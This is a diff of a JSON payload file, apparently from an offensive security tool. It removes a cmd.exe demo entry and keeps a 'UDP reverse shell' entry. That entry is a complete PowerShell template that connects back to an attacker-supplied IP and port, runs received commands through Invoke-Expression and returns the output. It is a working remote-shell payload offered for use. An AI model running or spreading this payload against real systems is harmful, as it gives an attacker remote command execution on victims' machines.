@@ -1,10 +1,6 @@
 {
   "payloads": [
     {
-      "payload_name": "Pop a cmd.exe shell as a demo",
-      "payload_template": "\"& ''cmd.exe'' /k {{COMMAND}}\""
-    },
-    {
       "payload_name": "UDP reverse shell",
       "payload_template": "$ip = ''{{IP}}'';$port = {{PORT}};$s = ''shell>'';$udpClient = new-object net.sockets.udpclient(0);$ready = [text.encoding]::ascii.getbytes($s); $udpClient.send($ready, $ready.length, $ip, $port); $ipep = new-object net.ipendpoint([net.ipaddress]::any, 0); ;while (1) { $command = [text.encoding]::UTF8.getstring($udpClient.receive([ref]$ipep)); $commandOutput = $(Invoke-Expression $command); $responseLength = [text.encoding]::UTF8.getbytes($commandOutput).length; if ($responseLength -notlike 0) { $udpClient.send([text.encoding]::UTF8.getbytes($commandOutput), $responseLength, $ip, $port); }} ;$udpClient.close();"
     },
